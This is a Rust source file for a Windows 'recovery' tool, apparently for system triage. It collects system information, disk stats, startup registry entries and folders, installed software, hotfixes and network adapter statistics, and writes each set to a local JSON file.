use crate::recovery::{
    context::RecoveryContext,
    output::write_json_artifact,
    registry::format_reg_value,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use directories::BaseDirs;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::{fs, process::Command, task};
use tracing::warn;
use winreg::{
    HKEY, RegKey,
    enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE},
};

pub fn system_tasks(_ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(SystemInfoTask),
        Arc::new(StartupProgramsTask),
        Arc::new(SoftwareInventoryTask),
        Arc::new(SystemUpdatesTask),
        Arc::new(NetworkStatsTask),
    ]
}

struct SystemInfoTask;

#[async_trait]
impl RecoveryTask for SystemInfoTask {
    fn label(&self) -> String {
        "System Inventory".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let properties = match capture_command_output("systeminfo", &[]).await {
            Ok(output) => parse_system_properties(&output),
            Err(err) => {
                warn!(error = ?err, "systeminfo command failed");
                Vec::new()
            }
        };

        let disk_stats =
            match capture_command_output("wmic", &["logicaldisk", "get", "Name,Size,FreeSpace"])
                .await
            {
                Ok(output) => parse_disk_stats(&output),
                Err(err) => {
                    warn!(error = ?err, "wmic disk query failed");
                    Vec::new()
                }
            };

        let network_configuration = match capture_command_output("ipconfig", &["/all"]).await {
            Ok(output) => output,
            Err(err) => {
                warn!(error = ?err, "ipconfig command failed");
                String::new()
            }
        };

        let summary = SystemSnapshot {
            properties,
            disk_stats,
            network_configuration,
        };

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "system-inventory.json",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct SystemSnapshot {
    properties: Vec<SystemProperty>,
    disk_stats: Vec<DiskStats>,
    network_configuration: String,
}

#[derive(Serialize)]
struct SystemProperty {
    key: String,
    value: String,
}

#[derive(Serialize)]
struct DiskStats {
    name: String,
    size_bytes: Option<u64>,
    free_bytes: Option<u64>,
}

async fn capture_command_output(cmd: &str, args: &[&str]) -> Result<String, RecoveryError> {
    let output = Command::new(cmd).args(args).output().await?;
    if !output.status.success() {
        return Err(RecoveryError::Custom(format!(
            "command `{cmd}` failed with code {:?}",
            output.status.code()
        )));
    }
    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

fn parse_system_properties(output: &str) -> Vec<SystemProperty> {
    output
        .lines()
        .filter_map(|line| {
            let line = line.trim();
            if line.is_empty() {
                return None;
            }

            let mut parts = line.splitn(2, ':');
            let key = parts.next()?.trim();
            let value = parts.next().unwrap_or_default().trim();
            if key.is_empty() {
                return None;
            }

            Some(SystemProperty {
                key: key.to_string(),
                value: value.to_string(),
            })
        })
        .collect()
}

fn parse_disk_stats(output: &str) -> Vec<DiskStats> {
    let mut stats = Vec::new();
    for line in output.lines().skip(1) {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let tokens: Vec<_> = trimmed.split_whitespace().collect();
        if tokens.len() < 3 {
            continue;
        }

        let free_bytes = tokens[0].parse::<u64>().ok();
        let name = tokens[1].to_string();
        let size_bytes = tokens[2].parse::<u64>().ok();

        stats.push(DiskStats {
            name,
            size_bytes,
            free_bytes,
        });
    }
    stats
}

struct StartupProgramsTask;

#[async_trait]
impl RecoveryTask for StartupProgramsTask {
    fn label(&self) -> String {
        "Startup Programs".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let registry_entries = collect_registry_entries().await?;
        let startup_directories = gather_startup_directories().await;

        let summary = StartupProgramsSummary {
            registry_entries,
            startup_directories,
        };

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "startup-programs.json",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct StartupProgramsSummary {
    registry_entries: Vec<RegistryStartupEntry>,
    startup_directories: Vec<StartupDirectory>,
}

#[derive(Serialize)]
struct RegistryStartupEntry {
    root: String,
    key: String,
    name: String,
    value: String,
}

#[derive(Serialize)]
struct StartupDirectory {
    label: String,
    path: String,
    entries: Vec<String>,
}

impl StartupDirectory {
    async fn describe(label: &str, path: PathBuf) -> Self {
        let entries = list_directory_entries(&path).await;
        Self {
            label: label.to_string(),
            path: path.display().to_string(),
            entries,
        }
    }
}

const REGISTRY_PATHS: &[&str] = &[
    r"Software\Microsoft\Windows\CurrentVersion\Run",
    r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
    r"Software\Microsoft\Windows\CurrentVersion\RunOnceEx",
    r"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
    r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
];

const REGISTRY_ROOTS: &[(HKEY, &str)] = &[
    (HKEY_CURRENT_USER, "HKEY_CURRENT_USER"),
    (HKEY_LOCAL_MACHINE, "HKEY_LOCAL_MACHINE"),
];

async fn collect_registry_entries() -> Result<Vec<RegistryStartupEntry>, RecoveryError> {
    let entries = task::spawn_blocking(|| collect_registry_entries_blocking())
        .await
        .map_err(|err| RecoveryError::Custom(format!("registry scan interrupted: {err}")))?;
    Ok(entries)
}

fn collect_registry_entries_blocking() -> Vec<RegistryStartupEntry> {
    let mut entries = Vec::new();
    for &(hkey, root_name) in REGISTRY_ROOTS {
        let root = RegKey::predef(hkey);

        for path in REGISTRY_PATHS {
            match root.open_subkey(path) {
                Ok(key) => {
                    for value_result in key.enum_values() {
                        if let Ok((name, value)) = value_result {
                            entries.push(RegistryStartupEntry {
                                root: root_name.to_string(),
                                key: path.to_string(),
                                name,
                                value: format_reg_value(&value),
                            });
                        }
                    }
                }
                Err(err) => {
                    warn!(root = root_name, path, error = ?err, "startup registry key unavailable");
                }
            }
        }
    }

    entries
}

async fn gather_startup_directories() -> Vec<StartupDirectory> {
    let mut directories = Vec::new();

    if let Some(base) = BaseDirs::new() {
        let user_path = base
            .data_dir()
            .join("Microsoft")
            .join("Windows")
            .join("Start Menu")
            .join("Programs")
            .join("Startup");
        directories.push(StartupDirectory::describe("User Startup", user_path).await);
    }

    if let Ok(program_data) = std::env::var("PROGRAMDATA") {
        let common_path = PathBuf::from(program_data)
            .join("Microsoft")
            .join("Windows")
            .join("Start Menu")
            .join("Programs")
            .join("Startup");
        directories.push(StartupDirectory::describe("Common Startup", common_path).await);
    }

    directories
}

async fn list_directory_entries(path: &Path) -> Vec<String> {
    let mut entries = Vec::new();
    match fs::read_dir(path).await {
        Ok(mut dir) => loop {
            match dir.next_entry().await {
                Ok(Some(entry)) => entries.push(entry.path().display().to_string()),
                Ok(None) => break,
                Err(err) => {
                    warn!(path = ?path, error = ?err, "failed to list startup folder");
                    break;
                }
            }
        },
        Err(err) => {
            warn!(path = ?path, error = ?err, "startup directory not readable");
        }
    }
    entries
}

struct SoftwareInventoryTask;

#[async_trait]
impl RecoveryTask for SoftwareInventoryTask {
    fn label(&self) -> String {
        "Installed Software".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let software = task::spawn_blocking(|| collect_installed_software())
            .await
            .map_err(|err| RecoveryError::Custom(format!("software scan interrupted: {err}")))?;

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "installed-software.json",
            &SoftwareInventorySummary { software },
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct SoftwareInventorySummary {
    software: Vec<SoftwareRecord>,
}

#[derive(Serialize)]
struct SoftwareRecord {
    name: String,
    version: Option<String>,
    publisher: Option<String>,
    install_date: Option<String>,
    install_location: Option<String>,
    source: String,
}

struct SystemUpdatesTask;

#[async_trait]
impl RecoveryTask for SystemUpdatesTask {
    fn label(&self) -> String {
        "System Updates".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = match capture_command_output("wmic", &["qfe", "list", "/format:list"]).await {
            Ok(output) => QuickFixSummary {
                updates: parse_quick_fix_output(&output),
            },
            Err(err) => {
                warn!(error = ?err, "wmic qfe query failed");
                QuickFixSummary {
                    updates: Vec::new(),
                }
            }
        };

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "system-updates.json",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct QuickFixSummary {
    updates: Vec<QuickFixRecord>,
}

#[derive(Serialize)]
struct QuickFixRecord {
    caption: Option<String>,
    description: Option<String>,
    hotfix_id: Option<String>,
    installed_on: Option<String>,
    cs_name: Option<String>,
}

struct NetworkStatsTask;

#[async_trait]
impl RecoveryTask for NetworkStatsTask {
    fn label(&self) -> String {
        "Network Adapter Stats".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let adapters = match capture_powershell_json(
            "Get-NetAdapterStatistics | Select-Object Name,ReceivedBytes,SentBytes | ConvertTo-Json -Depth 1",
        )
        .await
        {
            Ok(value) => parse_network_stats(value),
            Err(err) => {
                warn!(error = ?err, "PowerShell adapter statistics failed");
                Vec::new()
            }
        };

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "network-adapters.json",
            &NetworkStatsSummary { adapters },
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct NetworkStatsSummary {
    adapters: Vec<NetAdapterStat>,
}

#[derive(Serialize)]
struct NetAdapterStat {
    name: String,
    received_bytes: Option<u64>,
    transmitted_bytes: Option<u64>,
}

#[derive(Deserialize)]
#[serde(rename_all = "PascalCase")]
struct RawNetAdapterStat {
    name: String,
    received_bytes: Option<u64>,
    sent_bytes: Option<u64>,
}

impl From<RawNetAdapterStat> for NetAdapterStat {
    fn from(raw: RawNetAdapterStat) -> Self {
        Self {
            name: raw.name,
            received_bytes: raw.received_bytes,
            transmitted_bytes: raw.sent_bytes,
        }
    }
}

async fn capture_powershell_json(script: &str) -> Result<Value, RecoveryError> {
    let output = Command::new("powershell")
        .arg("-NoProfile")
        .arg("-Command")
        .arg(script)
        .output()
        .await?;

    if !output.status.success() {
        return Err(RecoveryError::Custom(format!(
            "PowerShell command failed with code {:?}",
            output.status.code()
        )));
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    if stdout.trim().is_empty() {
        return Ok(Value::Null);
    }

    serde_json::from_str(stdout.trim())
        .map_err(|err| RecoveryError::Custom(format!("PowerShell JSON parse failed: {err}")))
}

fn parse_network_stats(value: Value) -> Vec<NetAdapterStat> {
    let mut adapters = Vec::new();
    match value {
        Value::Array(items) => {
            for item in items {
                if let Ok(raw) = serde_json::from_value::<RawNetAdapterStat>(item) {
                    adapters.push(raw.into());
                }
            }
        }
        Value::Object(_) => {
            if let Ok(raw) = serde_json::from_value::<RawNetAdapterStat>(value) {
                adapters.push(raw.into());
            }
        }
        _ => {}
    }
    adapters
}

fn parse_quick_fix_output(output: &str) -> Vec<QuickFixRecord> {
    let mut updates = Vec::new();
    let mut current = HashMap::new();

    for line in output.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            if !current.is_empty() {
                updates.push(record_from_map(&current));
                current.clear();
            }
            continue;
        }

        if let Some((key, value)) = trimmed.split_once('=') {
            current.insert(key.to_string(), value.to_string());
        }
    }

    if !current.is_empty() {
        updates.push(record_from_map(&current));
    }

    updates
}

fn record_from_map(map: &HashMap<String, String>) -> QuickFixRecord {
    QuickFixRecord {
        caption: map.get("Caption").cloned(),
        description: map.get("Description").cloned(),
        hotfix_id: map.get("HotFixID").cloned(),
        installed_on: map.get("InstalledOn").cloned(),
        cs_name: map.get("CSName").cloned(),
    }
}

fn collect_installed_software() -> Vec<SoftwareRecord> {
    const SOFTWARE_LOCATIONS: &[InstallLocation] = &[
        InstallLocation {
            root: HKEY_LOCAL_MACHINE,
            path: r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        },
        InstallLocation {
            root: HKEY_LOCAL_MACHINE,
            path: r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
        },
        InstallLocation {
            root: HKEY_CURRENT_USER,
            path: r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        },
    ];

    let mut records = Vec::new();

    for location in SOFTWARE_LOCATIONS {
        let root = RegKey::predef(location.root);
        if let Ok(key) = root.open_subkey(location.path) {
            for subkey in key.enum_keys().filter_map(Result::ok) {
                if let Ok(entry) = key.open_subkey(&subkey) {
                    if let Some(name) = read_string_value(&entry, "DisplayName") {
                        records.push(SoftwareRecord {
                            name,
                            version: read_string_value(&entry, "DisplayVersion"),
                            publisher: read_string_value(&entry, "Publisher"),
                            install_date: read_string_value(&entry, "InstallDate"),
                            install_location: read_string_value(&entry, "InstallLocation"),
                            source: format!(r"{}\{}", location.path, subkey),
                        });
                    }
                }
            }
        }
    }

    records
}

fn read_string_value(key: &RegKey, name: &str) -> Option<String> {
    key.get_value::<String, _>(name).ok()
}

struct InstallLocation {
    root: HKEY,
    path: &'static str,
}
